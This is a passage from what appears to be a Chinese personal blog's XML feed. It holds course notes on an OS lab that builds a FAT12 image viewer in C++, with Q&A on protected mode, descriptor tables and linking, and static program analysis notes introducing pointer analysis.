sys_write ：</p><p>修改的 sys_call 如下。当前运行的进程是通过设置 p_proc_ready 来恢复执行的，所以当进程切换到未发生之前， p_proc_ready 的值就是指向当前进程的指针。把它压栈就是把当前进程即 write( ) 的调用者指针传递给了 sys_write( ) ：</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSLab2</title>
      <link href="/2022/11/14/OSLab2/"/>
      <url>/2022/11/14/OSLab2/</url>
      
        <content type="html"><![CDATA[<h1>实验要求</h1><p>实现一个FAT12镜像查看工具。本次实验重点在于：熟悉掌握FAT12文件系统、gcc+nasm联合编译，了解实模式与保护模式的基本内容。</p><p>用C/C++和nasm编写一个FAT12镜像查看工具，读取一个.img格式的文件并响应用户输入。</p><h2 id="功能列表"><a class="header-anchor" href="#功能列表">¶</a>功能列表</h2><ol><li>运行程序后，读取FAT12镜像文件，并提示用户输入指令</li><li>用户输入ls 路径，输出根目录及其子目录的文件和目录列表。</li><li>首先输出路径名，加一个冒号:，换行，再输出文件和目录列表；</li><li>使用红色(\033[31m)颜色输出目录的文件名，不添加特殊颜色输出文件的文件名。</li><li>当用户不添加任何选项执行ls命令时，每个文件/目录项之前用两个空格隔开</li><li>当用户添加-l为参数时，</li><li>在路径名后，冒号前，另输出此目录下直接子目录和直接子文件的数目，两个数字之间用空格连接。此两个数字不添加特殊颜色</li><li>每个文件/目录占据一行，在输出文件/目录名后，空一格，之后：</li><li>若项为目录，输出此目录下直接子目录和直接子文件的数目，两个数字之间用空格连接。此两个数字不添加特殊颜色</li><li>不输出.和…目录的子目录、子文件数目</li><li>若项为文件，输出文件的大小</li><li>对于-l参数用户可以在命令任何位置、设置任意多次-l参数，但只能设置一次文件名</li><li>直接子目录不计算.和…</li><li>当用户给出不支持的命令参数时，报错</li><li>当用户不设定路径时，默认路径为镜像文件根目录</li><li>用户输入cat 文件名，输出路径对应文件的内容， 若路径不存在或不是一个普通文件则给出提示，提示内容不严格限定，但必须体现出错误所在。</li><li>用户输入exit， 退出程序。</li></ol><h1>实现思路</h1><p>读取指令略去，先简单记录一下如何查找目录及文件：</p><h2 id="FAT12-根据路径字符串查找目录及文件"><a class="header-anchor" href="#FAT12-根据路径字符串查找目录及文件">¶</a>FAT12 根据路径字符串查找目录及文件</h2><p>对于字符串将其按<code>/</code>分割，根据需求处理<code>.</code>和<code>..</code>的问题。然后调用<code>searchTargetDir(target, des)</code>，函数会搜索并修改target的值，获得在数据区的位置。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 19-32号扇区为根目录文件项</span></span><br><span class="line"><span class="comment">//从根目录文件项起始位开始向后寻找目录</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">searchTargetDir</span><span class="params">(<span class="keyword">int</span> target, string des)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (file[target] == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">11</span>; i++) <span class="comment">// 0-10B是名字，文件的话，8-10B是后缀</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">isTrue</span>(file[target + i]))</span><br><span class="line">&#123;</span><br><span class="line">target += <span class="number">32</span>; <span class="comment">//每个目录项为32B，跳到下一项</span></span><br><span class="line">flag = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (file[target + <span class="number">11</span>] == <span class="number">0x10</span>) <span class="comment">// 11B为属性项：15——长目录项，可跳过；16：文件夹；32：文件</span></span><br><span class="line">&#123;</span><br><span class="line">string m = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">11</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (file[target + i] != <span class="number">0x20</span>)</span><br><span class="line">&#123; <span class="comment">//不是文件则为路径</span></span><br><span class="line">m = m + <span class="built_in"><span class="keyword">char</span></span>(file[target + i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (m == des)</span><br><span class="line">&#123; <span class="comment">// 33号扇区往后为数据区，26-27B表示在数据区的簇号</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">512</span> * <span class="number">33</span> + (file[target + <span class="number">26</span>] - <span class="number">2</span>) * <span class="number">512</span>; <span class="comment">// 数据区起始地址对应编号为2</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">target += <span class="number">32</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">searchTargetFile</span><span class="params">(<span class="keyword">int</span> target, string name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (file[target] == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">11</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">isTrue</span>(file[target + i]))</span><br><span class="line">&#123;</span><br><span class="line">target += <span class="number">32</span>;</span><br><span class="line">flag = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (file[target + <span class="number">11</span>] == <span class="number">0x20</span>) <span class="comment">// 11B属性，0x20代表文件</span></span><br><span class="line">&#123;</span><br><span class="line">string m = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) <span class="comment">// 0-7B名字</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (file[target + i] != <span class="number">0x20</span>)</span><br><span class="line">m = m + <span class="built_in"><span class="keyword">char</span></span>(file[target + i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (file[target + <span class="number">8</span>] != <span class="number">0x20</span>)</span><br><span class="line">&#123;</span><br><span class="line">m = m + <span class="string">&quot;.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">8</span>; i &lt; <span class="number">11</span>; i++) <span class="comment">// 8-10B：.后缀</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (file[target + i] != <span class="number">0x20</span>)</span><br><span class="line">m = m + <span class="built_in"><span class="keyword">char</span></span>(file[target + i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (m == name)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">512</span> * <span class="number">33</span> + (file[target + <span class="number">26</span>] - <span class="number">2</span>) * <span class="number">512</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">target += <span class="number">32</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="实现cat：读取文件内容"><a class="header-anchor" href="#实现cat：读取文件内容">¶</a>实现cat：读取文件内容</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> cluster = target / <span class="number">512</span> - <span class="number">33</span> + <span class="number">2</span>; <span class="comment">//计算簇数，从33号扇区开始，起始对应编号为2</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">string str = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; file[target + i] != <span class="number">0</span> &amp;&amp; i &lt; <span class="number">512</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> c = (<span class="keyword">char</span>)file[target + i];</span><br><span class="line">str = str + c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printSentence</span>(str, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (i != <span class="number">512</span>)</span><br><span class="line">&#123; <span class="comment">//文件结束</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (cluster % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">&#123; <span class="comment">// FAT12: 12位代表一个FAT项，2个FAT占3个字节</span></span><br><span class="line"><span class="keyword">int</span> fat12 = <span class="number">512</span> + cluster / <span class="number">2</span> * <span class="number">3</span>;</span><br><span class="line">cluster = ((file[fat12 + <span class="number">1</span>] &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">8</span>) | file[fat12]; <span class="comment">//左移8位（低位补零），计算簇数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> fat12 = <span class="number">513</span> + cluster / <span class="number">2</span> * <span class="number">3</span>;</span><br><span class="line">cluster = (file[fat12 + <span class="number">1</span>] &lt;&lt; <span class="number">4</span>) | (file[fat12] &gt;&gt; <span class="number">4</span> &amp; <span class="number">0x0F</span>);</span><br><span class="line">&#125;</span><br><span class="line">target = <span class="number">512</span> * <span class="number">33</span> + (cluster - <span class="number">2</span>) * <span class="number">512</span>; <span class="comment">//重新计算tgt</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>cluster = target / 512 - 33 + 2;</code>计算簇数，从33号扇区开始，起始对应编号为2，在一个簇读取完毕时，需要到下一个簇区，由于FAT12中12位代表一个FAT项，2个FAT占3个字节，故需要分奇偶来处理。</p><h1>问答题</h1><h2 id="课件相关"><a class="header-anchor" href="#课件相关">¶</a>课件相关</h2><h3 id="1-什么是实模式，什么是保护模式？"><a class="header-anchor" href="#1-什么是实模式，什么是保护模式？">¶</a>1.什么是实模式，什么是保护模式？</h3><p>实模式使用基地址加偏移量的方式就可以直接拿到物理地址的模式。</p><p>保护模式是不能直接拿到物理地址的模式，需要进行地址转换。</p><h3 id="2-什么是选择子？"><a class="header-anchor" href="#2-什么是选择子？">¶</a>2.什么是选择子？</h3><p>选择子总共16位，存放在段选择寄存器中，低2位表示请求特权级，第3位表示选择GDT方式还是LDT方式，高13位表示在描述符表中的偏移。</p><h3 id="3-什么是描述符？"><a class="header-anchor" href="#3-什么是描述符？">¶</a>3.什么是描述符？</h3><p>保护模式下引入描述符来描述各种数据段，所有的描述符均为8个字节（0-7），由第5个字节说明描述符的类型。类型不同，描述符的结构也有所不同。</p><h3 id="4-什么是GDT，什么是LDT？"><a class="header-anchor" href="#4-什么是GDT，什么是LDT？">¶</a>4.什么是GDT，什么是LDT？</h3><p>GDT是全局描述符表，是全局唯一的。存放一些公有的描述符和包含各进程局部描述符表首地址的描述符。</p><p>LDT是局部描述符表，每个进程都可以有一个。存放本进程中使用的描述符。</p><h3 id="5-请分别说明GDTR和LDTR的结构"><a class="header-anchor" href="#5-请分别说明GDTR和LDTR的结构">¶</a>5.请分别说明GDTR和LDTR的结构</h3><p>GDTR：48位寄存器，高32位放置GDT首地址，低16位放置GDT限长，限长决定了可寻址的大小。（注意低16位放的不是选择子）</p><p>LDTR：16位寄存器，放置一个特殊的选择子，用于查找当前进程的LDT首地址。</p><h3 id="6-请说明GDT直接查找物理地址的具体地址"><a class="header-anchor" href="#6-请说明GDT直接查找物理地址的具体地址">¶</a>6.请说明GDT直接查找物理地址的具体地址</h3><ol><li><p>给出段选择子（放置在段选择寄存器中）+偏移量</p></li><li><p>若选择了GDT方式，从GDTR中获取GDT首地址，用段选择子中的13位做偏移，拿到GDT中的描述符</p></li><li><p>如果合法且有权限，用描述符中的段首地址加上1中的偏移量找到物理地址，寻址结束</p></li></ol><h3 id="7-请说明通过LDT查找物理地址的具体步骤"><a class="header-anchor" href="#7-请说明通过LDT查找物理地址的具体步骤">¶</a>7.请说明通过LDT查找物理地址的具体步骤</h3><ol><li><p>给出段选择子（放置在段选择寄存器中）+偏移量</p></li><li><p>若选择了LDT方式，则从GDTR获取GDT首地址，用LDTR中的偏移量做偏移，拿到GDT中的描述符1</p></li><li><p>从描述符1获取LDT首地址，用段选择子中的13位做偏移，拿到LDT中的描述符2</p></li><li><p>如果合法且有权限，用描述符2中的段首地址加上1中的偏移量找到物理地址，寻址结束</p></li></ol><h3 id="8-根目录区大小一定吗？扇区号是多少？为什么？"><a class="header-anchor" href="#8-根目录区大小一定吗？扇区号是多少？为什么？">¶</a>8.根目录区大小一定吗？扇区号是多少？为什么？</h3><p>不一定，根目录区位于第二个FAT表之后，开始的扇区号为19，它由若干个目录条目（Directory Entry）组成，条目最多有BPB_RootEntCnt个。由于根目录区的大小是依赖于BPB_RootEntCnt的，所以长度不固定，根目录区中的每一个条目占用32字节。（BPB_RootEntCnt即根目录文件数（条目数）最大值）</p><h3 id="9-数据区第一个簇号是多少？为什么？"><a class="header-anchor" href="#9-数据区第一个簇号是多少？为什么？">¶</a>9.数据区第一个簇号是多少？为什么？</h3><p>需要根据根目录大小RootDirSectors计算，数据区DataSectors=RootDirSectors+引导扇区（1）+FAT1（9）+FAT2（9），一般值是33。</p><p>数据区的第一个簇是2，因为1.44M的软盘上，FAT前三个字节的值是固定的0xF0、0xFF、0xFF用于表示这是一个应用在1.44M软盘上的FAT12文件系统。本来序号为0和1的FAT表项应该对应簇0和簇1，但是这两个表项都被设置为固定值，簇0和簇1没有存在意义。</p><h3 id="10-FAT表的作用？"><a class="header-anchor" href="#10-FAT表的作用？">¶</a>10.FAT表的作用？</h3><p>文件分配表被划分为紧密排列的若干个表项，每个表项都与数据区中的一个簇相对应，而且表项的序号也是与簇号一一对应。</p><h3 id="11-解释静态链接的过程"><a class="header-anchor" href="#11-解释静态链接的过程">¶</a>11.解释静态链接的过程</h3><p>静态链接是指在编译阶段直接把静态库加入到可执行文件中，这样可能导致可执行文件比较大。</p><ol><li><p>空间与地址的分配：每个.o文件都有自己的段属性，比如.text和.data等，链接的第一步就是将这些段属性合并在一起。</p></li><li><p>符号解析和重定位：重定位（修正地址）、重定位表（相对地址修正）</p></li></ol><h3 id="12-解释动态链接的过程"><a class="header-anchor" href="#12-解释动态链接的过程">¶</a>12.解释动态链接的过程</h3><p>动态链接是指链接阶段仅仅加入一些描述信息，而程序执行时再从系统中把相应动态库加载到内存中去。</p><ol><li><p>动态链接器自举</p><p>动态链接器本身也是一个不依赖其他共享对象的共享对象，需要完成自举。</p></li><li><p>装载共享对象</p><p>将可执行文件和链接器自身的符号合并成为全局符号表，开始寻找依赖对象。加载对象的过程可以看作图的遍历过程；新的共享对象加载进来后，其符号将合并入全局符号表；加载完毕后，全局符号表将包含进程动态链接所需全部符号。</p></li><li><p>重定位和初始化</p><p>链接器遍历可执行文件和共享对象的重定位表，将它们GOT/PLT中每个需要重定位的位置进行修正。完成重定位后，链接器执行.init段的代码，进行共享对象特有的初始化过程（例如C++里全局对象的构造函数）</p></li><li><p>转交控制权</p><p>完成所有工作，将控制权转交给程序的入口开始执行。</p></li></ol><h3 id="13-静态链接为什么使用ld链接而不是gcc"><a class="header-anchor" href="#13-静态链接为什么使用ld链接而不是gcc">¶</a>13.静态链接为什么使用ld链接而不是gcc</h3><p>gcc工具链包含很多工具，其中用于链接的是ld，ld是binutils工具集的底层部件，所以工作在汇编级别。</p><h3 id="14-linux下可执行文件的虚拟地址空间默认从哪里开始分配？"><a class="header-anchor" href="#14-linux下可执行文件的虚拟地址空间默认从哪里开始分配？">¶</a>14.linux下可执行文件的虚拟地址空间默认从哪里开始分配？</h3><p>0x08048000</p><h2 id="实验相关问题"><a class="header-anchor" href="#实验相关问题">¶</a>实验相关问题</h2><h2 id="1-BPB指定字段的含义"><a class="header-anchor" href="#1-BPB指定字段的含义">¶</a>1.BPB指定字段的含义</h2><table><thead><tr><th>名称</th><th>偏移</th><th>长度</th><th>内容</th></tr></thead><tbody><tr><td>BS_jmpBoot</td><td>0</td><td>3</td><td>一个短跳转指令</td></tr><tr><td>BS_OEMName</td><td>3</td><td>8</td><td>厂商名</td></tr><tr><td>BPB_BytsPerSec</td><td>11</td><td>2</td><td>每扇区字节数</td></tr><tr><td>BPB_SecPerClus</td><td>13</td><td>1</td><td>每簇扇区数</td></tr><tr><td>BPB_RsvdSecCnt</td><td>14</td><td>2</td><td>Boot记录占用多少扇区</td></tr><tr><td>BPB_NumFATs</td><td>16</td><td>1</td><td>共有多少FAT表</td></tr><tr><td>BPB_RootEntCnt</td><td>17</td><td>2</td><td>根目录文件数最大值</td></tr><tr><td>BPB_TotSec16</td><td>19</td><td>2</td><td>扇区总数</td></tr><tr><td>BPB_Media</td><td>21</td><td>1</td><td>介质描述符</td></tr><tr><td>BPB_FATSz16</td><td>22</td><td>2</td><td>每FAT扇区数</td></tr><tr><td>BPB_SecPerTrk</td><td>24</td><td>2</td><td>每磁道扇区数</td></tr><tr><td>BPB_NumHeads</td><td>26</td><td>2</td><td>磁头数（面数）</td></tr><tr><td>BPB_HiddSec</td><td>28</td><td>4</td><td>隐藏扇区数</td></tr><tr><td>BPB_TotSecc32</td><td>32</td><td>4</td><td>若BPB_TotSec16为0，由这个值记录扇区</td></tr><tr><td>BS_DrvNum</td><td>36</td><td>1</td><td>中断13的驱动器号</td></tr><tr><td>BS_Reservedl</td><td>37</td><td>1</td><td>未使用</td></tr><tr><td>BS_BootSig</td><td>38</td><td>1</td><td>扩展引导标记</td></tr><tr><td>BS_VolID</td><td>39</td><td>4</td><td>卷序列号</td></tr><tr><td>BS_VolLab</td><td>43</td><td>11</td><td>卷标</td></tr><tr><td>BS_FileSysType</td><td>54</td><td>8</td><td>文件系统类型</td></tr><tr><td>引导代码及其他</td><td>62</td><td>448</td><td>引导代码、数据、其他填充字符</td></tr><tr><td>结束标志</td><td>510</td><td>2</td><td>0xAA55</td></tr></tbody></table><h2 id="2-如何进行C代码和汇编之间的参数传递和返回值传递"><a class="header-anchor" href="#2-如何进行C代码和汇编之间的参数传递和返回值传递">¶</a>2.如何进行C代码和汇编之间的参数传递和返回值传递?</h2><p>参数传递，可以通过栈esp完成，C调用时的函数参数会被放置在esp中，然后汇编从esp+4开始，逐一拿出参数。</p><p>汇编语言的返回值，放置在eax中进行返回。</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SPA-06</title>
      <link href="/2022/11/07/SPA-06/"/>
      <url>/2022/11/07/SPA-06/</url>
      
        <content type="html"><![CDATA[<h1>Pointer Analysis</h1><h2 id="Motivation"><a class="header-anchor" href="#Motivation">¶</a>Motivation</h2><p>先看这个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Number n = new One();</span><br><span class="line">int x = n.get();</span><br><span class="line"></span><br><span class="line">class Zero implements Number&#123;...&#125;</span><br><span class="line">class One implements Number&#123;...&#125;</span><br></pre></td></tr></table></figure><p>由于我们在 CHA 中只会分析到 <code>Number n = ...</code>，因此我们会认为 x 的 call target 不止一个，因此 x 是 NAC。但这是不准确的，我们可以通过分析 n 所指向的对象来获得确实的常量。</p><h2 id="Introduction-to-Pointer-Analysis"><a class="header-anchor" href="#Introduction-to-Pointer-Analysis">¶</a>Introduction to Pointer Analysis</h2><p>对于一个简单的程序， 我们人脑分析是非常直白的。New 语句不就在那里吗？记下来不就好了。</p><p>然而，在实际的工程当中，分析的表项甚至以亿计。在这种量变之中，如何解决引起的质变，就是我们需要考虑的问题。</p><p>关于 PTA 的一些介绍，请看讲义本体，这里就不再复制粘贴了。</p><p>总之，通过指针分析，我们希望给定一个「指针（Pointer）」，它的指向集（Point-to Set）有可能包含哪些 object。</p><h2 id="Key-Factors-of-Pointer-Analysis"><a class="header-anchor" href="#Key-Factors-of-Pointer-Analysis">¶</a>Key Factors of Pointer Analysis</h2><p>指针分析存在几个可以考虑的方面：</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20211021192911882.png" alt></p><h3 id="Heap-Abstraction"><a class="header-anchor" href="#Heap-Abstraction">¶</a>Heap Abstraction</h3><p>第一个要回答的问题是，如果我们要知道变量指向哪个 object，那么如何对 object 本身建模？</p><p>考虑下面这样一个代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; x; i++)&#123;</span><br><span class="line"><span class="number">2</span>     a = <span class="keyword">new</span> A();</span><br><span class="line"><span class="number">3</span>     <span class="comment">//...</span></span><br><span class="line"><span class="number">4</span> &#125;</span><br></pre></td></tr></table></figure><p>在实际运行的过程中，创建对象的数量会因为 x 的不同而不同。在静态分析的过程中，我们不可能去假设 x 每一个可能的值，然后去分析创建出来的对象有什么指向关系。</p><p>一种常用的方法是基于 allocation site 来抽象一个对象。即，每一个 New 所创建出来的对象，我们都认为是同一个，然后在这个抽象下去分析。</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20220103143322127.png" alt></p><p>例如，我们把第二行的对象抽象为 o_2，而不去构建 o_2_iteration1, o_2_iteration2…</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20220103143423818.png" alt></p><p>由于代码中的 New 语句是有限的，因此我们抽象出来的对象自然也就是有限的了。</p><h3 id="Context-Sensitivity"><a class="header-anchor" href="#Context-Sensitivity">¶</a>Context Sensitivity</h3><p>所谓上下文，就是说我可以记住调用是在哪里发生的。例如，同样都是调用 <code>id(...)</code>，我可以区分出这是第几行发生的。</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20220103143731966.png" alt></p><p>注意到，如果我们不去考虑上下文，那么由于 <code>x = id(n1)</code> 和 <code>y = id(n2)</code> 在 ICFG 上无法区分 return 边对应哪个 entry 边，因此数据流只能混杂到一起，我们只能得到 <code>i = NAC</code>。</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20220103145117097.png" alt></p><p>因此基本上都会考虑上下文，不过在课程中我们会从上下文不敏感开始学习。</p><h3 id="Flow-Sensitivity"><a class="header-anchor" href="#Flow-Sensitivity">¶</a>Flow Sensitivity</h3><p>流的敏感和不敏感主要说的是我们是否考虑一个方法内的前后执行顺序。例如下面这段代码：</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20220103150612877.png" alt></p><p>蓝色的是流敏感分析，橙色的是流不敏感分析。流敏感很好理解，流不敏感则是因为我们认为 <code>c.f = &quot;y&quot;</code> 会传播到整个程序上，而非「在 <code>s = c.f</code>之后」，因此会出现对 <code>s</code> 的可能结果存在误报。</p><p>那看起来流敏感是个不错的选择。然而在实现的时候，流敏感会比流不敏感复杂，但是这样的开销，却不会产生远优于流不敏感的效果。因此实践中一般采取流不敏感的策略。</p><h3 id="Analysis-scope"><a class="header-anchor" href="#Analysis-scope">¶</a>Analysis scope</h3><p>最后一个因素是分析什么地方。这里的区别在于，可以分析全程序的指针指向关系，也可以分析影响某个 call site 或者指针的相关程序部分（也就是 demand driven）。</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20220103151302200.png" alt></p><p>全程序分析是蓝色的结果，但是如果我们只需要构建 CG，那么我们其实只需要分析 z 的指向关系，此时我们可以略过 x 和 y 的指向关系分析。本课程选择全程序的分析。</p><h2 id="Concerned-Statements"><a class="header-anchor" href="#Concerned-Statements">¶</a>Concerned Statements</h2><p>还记得我们提到我们采用的是流不敏感分析。这种分析方法给我们带来的便利就是，控制流语句都可以被省略了。</p><ul><li>if-else</li><li>while-for-do while</li><li>switch-case</li><li>break-continue</li><li>…</li></ul><p>这些语句都可以被忽略。我们的教学环境是 Java，在 Java 中，我们只需要关心：</p><ul><li><p>可以用来构建指向关系的东西（即指针）：</p><ul><li><p>Local variable: <code>int x</code>, <code>A y</code>, <code>String z</code></p></li><li><p>Static field: <code>A.f</code>，它可以当做一个全局变量来处理，因此和局部变量的处理是差不多的。</p></li><li><p>Instance field: <code>x.f</code></p></li><li><p>Array element: <code>a[i]</code>，但是静态分析通常很难算出某个下标指向什么，因此我们会忽略下标，将数组本身视为一个 field（即 <code>a[*]</code> 都被视为 <code>a.arr</code>）。</p></li></ul></li><li><p>导致指向关系发生变化的语句：</p><ul><li><code>x = new T()</code>，这会将一个新的 abstract object 添加到 x 的 point-to set 中</li><li><code>x = y</code>，这会将 <code>y</code> 的 point-to set 传播给 <code>x</code></li><li><code>x.f = y</code>，这会将 <code>y</code> 的 point-to set 传播给 <code>o.f</code>，其中 <code>o</code> 是 <code>x</code> 的 point-to set 中的任一 object</li><li><code>y = x.f</code>，与上面类似。</li><li><code>r = x.k(a, ...)</code>，将 <code>o.k(a, ...)</code> 的 return 出来的 point-to set 传播给 <code>r</code>。注意到 call 也有好几种，我们只关注 virtual call。</li></ul></li></ul><h2 id="划重点"><a class="header-anchor" href="#划重点">¶</a>划重点</h2><ul><li>什么是指针分析（PTA）</li><li>PTA 的关键要素</li><li>PTA 会考虑哪些东西</li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SPA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SPA-05</title>
      <link href="/2022/11/01/SPA-05/"/>
      <url>/2022/11/01/SPA-05/</url>
      
